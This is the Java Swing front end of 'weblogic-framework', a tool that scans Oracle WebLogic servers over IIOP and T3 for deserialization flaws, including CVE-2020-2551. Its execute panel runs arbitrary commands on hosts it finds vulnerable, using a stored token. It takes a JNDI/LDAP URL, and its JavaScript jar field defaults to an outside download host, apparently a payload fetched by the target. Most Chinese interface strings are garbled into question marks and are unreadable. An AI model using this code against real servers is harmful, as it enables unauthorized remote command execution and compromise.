/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.r4v3zn.weblogic.framework.ui;

import com.intellij.uiDesigner.core.GridConstraints;
import com.intellij.uiDesigner.core.GridLayoutManager;
import com.intellij.uiDesigner.core.Spacer;
import com.r4v3zn.weblogic.framework.enmus.CallEnum;
import com.r4v3zn.weblogic.framework.entity.MyException;
import com.r4v3zn.weblogic.framework.entity.VulCheckParam;
import com.r4v3zn.weblogic.framework.utils.CallUtils;
import com.r4v3zn.weblogic.framework.utils.StringUtils;
import com.r4v3zn.weblogic.framework.utils.VulUtils;
import com.r4v3zn.weblogic.framework.vuls.VulTest;
import org.apache.commons.lang3.concurrent.BasicThreadFactory;

import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.lang.reflect.Field;
import java.util.List;
import java.util.*;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import static com.r4v3zn.weblogic.framework.utils.CheckUtils.checkIIOP;
import static com.r4v3zn.weblogic.framework.utils.CheckUtils.checkT3;
import static com.r4v3zn.weblogic.framework.utils.ContextUtils.clearContext;
import static com.r4v3zn.weblogic.framework.utils.VersionUtils.getVersion;
import static com.r4v3zn.weblogic.framework.utils.VersionUtils.getVersionClear;
import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: Main
 * Desc: Main
 * Date:2020/4/2 20:01
 * Email:woo0nise@gmail.com
 * Company:www.j2ee.app
 *
 * @author R4v3zn
 * @version 1.0.0
 */
public class Main extends JFrame {

    Logger log = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);

    private JPanel mainPanel;
    private JTextField targetText;
    private JLabel targetLabel;
    private JTextField javascriptText;
    private JLabel javascriptLabel;
    private JLabel vulNumberLabel;
    private JComboBox vulComboBox;
    private JPanel serverInfoPanel;
    private JTextArea serverInfoText;
    private JButton checkButton;
    private JTabbedPane dataPanel;
    private JPanel cmdExecutePanel;
    private JTextField tokenText;
    private JTextField cmdText;
    private JButton executeButton;
    private JTextArea cmdRspTextArea;
    private JLabel tokenLabel;
    private JLabel cmdLabel;
    private JScrollPane cmdScrollPane;
    private JScrollPane serverInfoScrollPane;
    private JComboBox callComboBox;
    private JComboBox charsetComboBox;
    private JLabel charsetLabel;
    private JLabel callText;
    private JTextField ldapUrlText;
    private JLabel protocolLabel;
    private JComboBox protocolComboBox;
    private JComboBox versionComboBox;
    private JLabel ldapLable;
    private JComboBox callResponseComboBox;
    private JLabel callLabel;
    private JPanel shellPanel;

    private Map<String, VulTest> vulMap = new HashMap<String, VulTest>(16);

    ScheduledExecutorService executorService = new ScheduledThreadPoolExecutor(5,
            new BasicThreadFactory.Builder().namingPattern("task-schedule-pool-%d").daemon(true).build());

    public Main(String title) {
        super(title);
        this.setContentPane(mainPanel);
        // init vul name
        String[] vulNames = VulTest.Utils.getVulNames();
        for (String vulName : vulNames) {
            vulComboBox.addItem(vulName);
        }
        String header = "\n" +
                "?????? `??????` ????????????????????????????????????????????? Weblogic ?????????.\n\n";
        String text = serverInfoText.getText();
        text = header + VulUtils.getVulInfo() + "\n" + text;
        serverInfoText.setText(text);
        this.setSize(1250, 650);
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.setLocationRelativeTo(null);
        // set call class
        for (String className : CallUtils.CALL_NAMES) {
            callComboBox.addItem(className);
        }

        checkButton.addActionListener(new ActionListener() {
            /**
             * Invoked when an action occurs.
             *
             * @param e
             */
            @Override
            public void actionPerformed(ActionEvent e) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        validateVul();
                    }
                }).start();
            }
        });
        executeButton.addActionListener(new ActionListener() {
            /**
             * Invoked when an action occurs.
             *
             * @param e
             */
            @Override
            public void actionPerformed(ActionEvent e) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        exploit();
                    }
                }).start();
            }
        });
        this.addWindowListener(new WindowAdapter() {
            /**
             * Invoked when a window is in the process of being closed.
             * The close operation can be overridden at this point.
             * @param e
             */
            @Override
            public void windowClosing(WindowEvent e) {
                // clear vul info
                super.windowClosing(e);
                clearContext(vulMap);
                vulMap.clear();
            }

            /**
             * Invoked when a window has been closed.
             * @param e
             */
            @Override
            public void windowClosed(WindowEvent e) {
                // clear vul info
                super.windowClosed(e);
                clearContext(vulMap);
                vulMap.clear();
            }
        });
        callResponseComboBox.addItemListener(new ItemListener() {
            /**
             * Invoked when an item has been selected or deselected by the user.
             * The code written for this method performs the operations
             * that need to occur when an item is selected (or deselected).
             *
             * @param e
             */
            @Override
            public void itemStateChanged(ItemEvent e) {
                String call = e.getItem().toString();
                if (isBlank(call) || call.toLowerCase().equals(CallEnum.JAVASCRIPT.getValue().toLowerCase())) {
                    javascriptText.setEnabled(true);
                } else if (call.toLowerCase().equals(CallEnum.FILE_OUTPUT_STREAM.getValue().toLowerCase())) {
                    javascriptText.setEnabled(false);
                }
            }
        });
    }

    /**
     * ????????????
     */
    private void validateVul() {
        clearContext(vulMap);
        vulMap.clear();
        serverInfoText.setText("");
        cmdRspTextArea.setText("");
        String javascriptUrl = javascriptText.getText().trim();
        String callName = callComboBox.getSelectedItem().toString();
        String ldapUrl = ldapUrlText.getText();
        ldapUrl = ldapUrl.trim();
        String charsetName = charsetComboBox.getSelectedItem().toString();
        if ("?????????".equals(charsetName)) {
            charsetName = null;
        }
        String vulName = vulComboBox.getSelectedItem().toString();
        String host = targetText.getText().trim();
        if (isBlank(host)) {
            serverInfoText.setText("??????URL????????????!");
            log.info("??????URL????????????!");
            return;
        }
        if (!host.startsWith("http")) {
            host = "http://" + host;
        }
        host = host.replace("\\", "/").replace("http://", "http:\\\\").replace("https://", "https:\\\\");
        if (host.lastIndexOf("/") != -1) {
            host = host.substring(0, host.lastIndexOf("/"));
        }
        host = host.replace("http:\\\\", "http://").replace("https:\\\\", "https://");
        String protocol = protocolComboBox.getSelectedItem().toString();
        protocol = protocol.toLowerCase();
        if (isBlank(protocol)) {
            protocol = "iiop";
        } else if (protocol.contains("iiop")) {
            protocol = "iiop";
        } else if (protocol.contains("t3")) {
            protocol = "t3";
        } else {
            protocol = "iiop";
        }
        // ????????????POC
        final List<Class<? extends VulTest>> vulClasses = new ArrayList<Class<? extends VulTest>>(VulTest.Utils.getVulTest());
        Collections.sort(vulClasses, new StringUtils.ToStringComparator());
        serverInfoText.append("???????????????......\n");
        log.info("???????????????......");
        boolean iiopFlag = false;
        boolean t3Flag = false;
        try {
            checkIIOP(host);
            serverInfoText.append(host + " IIOP ????????????!\n");
            log.info(host + " IIOP ????????????!");
            iiopFlag = true;
        } catch (Exception e) {
            serverInfoText.append(e.getMessage() + "\n");
            log.error(e.getMessage() + "");
        }
        try {
            checkT3(host);
            serverInfoText.append(host + " T3 ????????????!\n");
            log.info(host + " T3 ????????????!");
            t3Flag = true;
        } catch (Exception e) {
            serverInfoText.append(e.getMessage() + "\n");
            log.error(e.getMessage() + "");
        }
        if (iiopFlag == false && t3Flag == false) {
            serverInfoText.append(host + " ???????????????!\n");
            log.error(host + " ???????????????!");
            return;
        }
        serverInfoText.append("???????????????.....\n");
        log.info("???????????????.....");
        String version = versionComboBox.getSelectedItem().toString();
        if ((!isBlank(version) && "??????".equals(version)) || isBlank(version)) {
            version = getVersion(host);
            if (isBlank(version)) {
                serverInfoText.append(host + " ??????????????????!\n");
                log.error(host + " ??????????????????!");
            }
        }
        serverInfoText.append(host + " version --> " + version + " !\n");
        log.info(host + " version --> " + version + " !");
        version = getVersionClear(version);
        serverInfoText.append(host + " version?????????????????? --> " + version + " !\n");
        log.info(host + " version?????????????????? --> " + version + " !");
        serverInfoText.append("???????????????.....\n");
        log.info("[*] ???????????????.....");
        VulCheckParam vulCheckParam = new VulCheckParam();
        vulCheckParam.setProtocol(protocol);
        vulCheckParam.setVersion(version);
        vulCheckParam.setCallName(callName);
        vulCheckParam.setCharsetName(charsetName);
        vulCheckParam.setJndiUrl(ldapUrl);
        vulCheckParam.setJavascriptUrl(javascriptUrl);
        String call = callResponseComboBox.getSelectedItem().toString();
        if (isBlank(call) || call.toLowerCase().equals(CallEnum.JAVASCRIPT.getValue().toLowerCase())) {
            vulCheckParam.setCall(CallEnum.JAVASCRIPT);
        } else if (call.toLowerCase().equals(CallEnum.FILE_OUTPUT_STREAM.getValue().toLowerCase())) {
            vulCheckParam.setCall(CallEnum.FILE_OUTPUT_STREAM);
        }
        validateVul(host, vulCheckParam, vulClasses, vulName);
//        validateVul(host, javascriptUrl, ldapUrl, charsetName, callName, vulClasses, vulName, protocol);
        serverInfoText.append(host + " ??????????????????!");
        log.info(host + " ??????????????????!");
    }

    /**
     * ????????????
     *
     * @param host          ??????URL
     * @param vulCheckParam ????????????
     * @param vulClasses    ALL ??????
     * @param vulName       ????????????
     */
    public void validateVul(String host, VulCheckParam vulCheckParam, List<Class<? extends VulTest>> vulClasses, String vulName) {
        String version = vulCheckParam.getVersion();
        // ???????????? vulClasses
        for (Class<? extends VulTest> clazz : vulClasses) {
            String simpleName = clazz.getSimpleName();
            vulName = vulName.replace("-", "_");
            if (!simpleName.equals(vulName) && !"?????????".equals(vulName)) {
                continue;
            }
            VulTest vulTest = null;
            boolean flag = false;
            String msg = "";
            try {
                vulTest = clazz.newInstance();
                vulCheckParam.setVersion(version);
                flag = vulTest.vulnerable(host, vulCheckParam);
            } catch (Exception e) {
                if (e instanceof MyException) {
                    msg = e.getMessage();
                } else {
                    e.printStackTrace();
                }
            }
            String token = "";
            if (flag) {
                try {
                    Field bindNameField = clazz.getDeclaredField("bindName");
                    bindNameField.setAccessible(true);
                    token = bindNameField.get(vulTest).toString();
                    vulMap.put(token, vulTest);
                } catch (NoSuchFieldException e) {
                    // TODO:
                } catch (IllegalAccessException e) {
                    // TODO:
                }
            }
            String tmpStr = "";
            if (!isBlank(msg)) {
                tmpStr = clazz.getSimpleName() + "  " + host + "  " + msg + "\n";
            } else {
                if (flag) {
                    tmpStr = clazz.getSimpleName().replace("_", "-") + "  " + host + "  ????????????  " + " token : " + token + "\n";
                } else {
                    tmpStr = clazz.getSimpleName().replace("_", "-") + "  " + host + "  ???????????????  " + " token : " + token + "\n";
                }
            }
            serverInfoText.append(tmpStr + "\n");
        }
    }

    /**
     * ????????????
     */
    public void exploit() {
        String host = targetText.getText().trim();
        host = host.replace("\\", "/");
        if (host.lastIndexOf("/") != -1) {
            host = host.substring(0, host.lastIndexOf("/"));
        }
        String token = tokenText.getText().trim();
        if (isBlank(token)) {
            cmdRspTextArea.setText("?????????Token");
            return;
        }
        String cmd = cmdText.getText().trim();
        if (isBlank(cmd)) {
            cmdRspTextArea.setText("?????????????????????");
            return;
        }
        cmdRspTextArea.setText(cmd + " ???????????????.....");
        VulTest vul = vulMap.get(token);
        String charsetName = charsetComboBox.getSelectedItem().toString();
        if ("??????".equals(charsetName)) {
            charsetName = null;
        }
        if (vul != null) {
            try {
                String rsp = vul.exploit(host, cmd, charsetName);
                cmdRspTextArea.setText(rsp);
            } catch (Exception ex) {
                if (ex instanceof MyException) {
                    cmdRspTextArea.setText(ex.getMessage());
                } else {
                    ex.printStackTrace();
                    cmdRspTextArea.setText("????????????");
                }
            }
        } else {
            cmdRspTextArea.setText("token ??????");
        }
    }

    public static void main(String[] args) {
        JFrame main = new Main("weblogic-framework is the best tool for detecting weblogic vulnerabilities.");
        main.setVisible(true);
    }


    {
// GUI initializer generated by IntelliJ IDEA GUI Designer
// >>> IMPORTANT!! <<<
// DO NOT EDIT OR ADD ANY CODE HERE!
        $$$setupUI$$$();
    }

    /**
     * Method generated by IntelliJ IDEA GUI Designer
     * >>> IMPORTANT!! <<<
     * DO NOT edit this method OR call it in your code!
     *
     * @noinspection ALL
     */
    private void $$$setupUI$$$() {
        mainPanel = new JPanel();
        mainPanel.setLayout(new GridLayoutManager(6, 10, new Insets(10, 10, 10, 10), -1, -1));
        targetLabel = new JLabel();
        targetLabel.setText("????????????");
        mainPanel.add(targetLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        targetText = new JTextField();
        targetText.setText("");
        mainPanel.add(targetText, new GridConstraints(0, 1, 1, 9, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        ldapLable = new JLabel();
        ldapLable.setText("LDAP ??????");
        mainPanel.add(ldapLable, new GridConstraints(2, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        ldapUrlText = new JTextField();
        ldapUrlText.setText("");
        mainPanel.add(ldapUrlText, new GridConstraints(2, 1, 1, 9, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        vulNumberLabel = new JLabel();
        vulNumberLabel.setText("????????????");
        mainPanel.add(vulNumberLabel, new GridConstraints(3, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        vulComboBox = new JComboBox();
        vulComboBox.setEnabled(true);
        final DefaultComboBoxModel defaultComboBoxModel1 = new DefaultComboBoxModel();
        defaultComboBoxModel1.addElement("?????????");
        vulComboBox.setModel(defaultComboBoxModel1);
        mainPanel.add(vulComboBox, new GridConstraints(3, 1, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        final Spacer spacer1 = new Spacer();
        mainPanel.add(spacer1, new GridConstraints(4, 0, 1, 10, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, 1, null, null, null, 0, false));
        dataPanel = new JTabbedPane();
        mainPanel.add(dataPanel, new GridConstraints(5, 0, 1, 10, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, new Dimension(200, 200), null, 0, false));
        serverInfoPanel = new JPanel();
        serverInfoPanel.setLayout(new GridLayoutManager(2, 2, new Insets(0, 0, 0, 0), -1, -1));
        dataPanel.addTab("????????????", serverInfoPanel);
        checkButton = new JButton();
        checkButton.setText("??????");
        serverInfoPanel.add(checkButton, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_EAST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        serverInfoScrollPane = new JScrollPane();
        serverInfoPanel.add(serverInfoScrollPane, new GridConstraints(1, 0, 1, 2, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, null, null, null, 0, false));
        serverInfoText = new JTextArea();
        serverInfoText.setEditable(false);
        serverInfoText.setLineWrap(true);
        serverInfoText.setText("\n???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????\n\n------------------------------------------------------\n\n\n???????????????\n\n2020-06-25\n\n  1????????? T3???IIOP ??????????????????\n\n  2????????? CVE-2020-2551 ????????????\n\n2020-04-01\n\n  1) ?????? weblogic ?????? 13 ?????????????????? NAT ??????.\n");
        serverInfoScrollPane.setViewportView(serverInfoText);
        cmdExecutePanel = new JPanel();
        cmdExecutePanel.setLayout(new GridLayoutManager(2, 6, new Insets(0, 0, 0, 0), -1, -1));
        dataPanel.addTab("????????????", cmdExecutePanel);
        tokenLabel = new JLabel();
        tokenLabel.setText("token");
        cmdExecutePanel.add(tokenLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        tokenText = new JTextField();
        cmdExecutePanel.add(tokenText, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        cmdLabel = new JLabel();
        cmdLabel.setText("????????????");
        cmdExecutePanel.add(cmdLabel, new GridConstraints(0, 2, 1, 2, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        cmdText = new JTextField();
        cmdExecutePanel.add(cmdText, new GridConstraints(0, 4, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        executeButton = new JButton();
        executeButton.setText("??????");
        cmdExecutePanel.add(executeButton, new GridConstraints(0, 5, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        cmdScrollPane = new JScrollPane();
        cmdExecutePanel.add(cmdScrollPane, new GridConstraints(1, 0, 1, 6, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, null, null, null, 0, false));
        cmdRspTextArea = new JTextArea();
        cmdRspTextArea.setEditable(false);
        cmdRspTextArea.setLineWrap(true);
        cmdScrollPane.setViewportView(cmdRspTextArea);
        shellPanel = new JPanel();
        shellPanel.setLayout(new GridLayoutManager(1, 1, new Insets(0, 0, 0, 0), -1, -1));
        dataPanel.addTab("????????????", shellPanel);
        callText = new JLabel();
        callText.setText("?????????");
        mainPanel.add(callText, new GridConstraints(3, 4, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        callComboBox = new JComboBox();
        mainPanel.add(callComboBox, new GridConstraints(3, 5, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        charsetLabel = new JLabel();
        charsetLabel.setText("??????");
        mainPanel.add(charsetLabel, new GridConstraints(3, 6, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        charsetComboBox = new JComboBox();
        final DefaultComboBoxModel defaultComboBoxModel2 = new DefaultComboBoxModel();
        defaultComboBoxModel2.addElement("??????");
        defaultComboBoxModel2.addElement("UTF-8");
        defaultComboBoxModel2.addElement("GBK");
        charsetComboBox.setModel(defaultComboBoxModel2);
        mainPanel.add(charsetComboBox, new GridConstraints(3, 7, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        protocolLabel = new JLabel();
        protocolLabel.setText("??????");
        mainPanel.add(protocolLabel, new GridConstraints(3, 2, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        protocolComboBox = new JComboBox();
        protocolComboBox.setEnabled(true);
        final DefaultComboBoxModel defaultComboBoxModel3 = new DefaultComboBoxModel();
        defaultComboBoxModel3.addElement("IIOP");
        defaultComboBoxModel3.addElement("T3");
        protocolComboBox.setModel(defaultComboBoxModel3);
        mainPanel.add(protocolComboBox, new GridConstraints(3, 3, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        final JLabel label1 = new JLabel();
        label1.setText("??????");
        mainPanel.add(label1, new GridConstraints(3, 8, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        versionComboBox = new JComboBox();
        versionComboBox.setEditable(true);
        final DefaultComboBoxModel defaultComboBoxModel4 = new DefaultComboBoxModel();
        defaultComboBoxModel4.addElement("??????");
        versionComboBox.setModel(defaultComboBoxModel4);
        mainPanel.add(versionComboBox, new GridConstraints(3, 9, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        callLabel = new JLabel();
        callLabel.setText("????????????");
        mainPanel.add(callLabel, new GridConstraints(1, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        callResponseComboBox = new JComboBox();
        callResponseComboBox.setEnabled(true);
        final DefaultComboBoxModel defaultComboBoxModel5 = new DefaultComboBoxModel();
        defaultComboBoxModel5.addElement("JavaScript");
        defaultComboBoxModel5.addElement("FileOutputStream");
        callResponseComboBox.setModel(defaultComboBoxModel5);
        mainPanel.add(callResponseComboBox, new GridConstraints(1, 1, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        javascriptLabel = new JLabel();
        javascriptLabel.setText("javascript ??????");
        mainPanel.add(javascriptLabel, new GridConstraints(1, 3, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        javascriptText = new JTextField();
        javascriptText.setText("http://qch7ecs9e.bkt.clouddn.com/com.bea.javascript.jar");
        mainPanel.add(javascriptText, new GridConstraints(1, 4, 1, 6, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
    }

    /**
     * @noinspection ALL
     */
    public JComponent $$$getRootComponent$$$() {
        return mainPanel;
    }

}
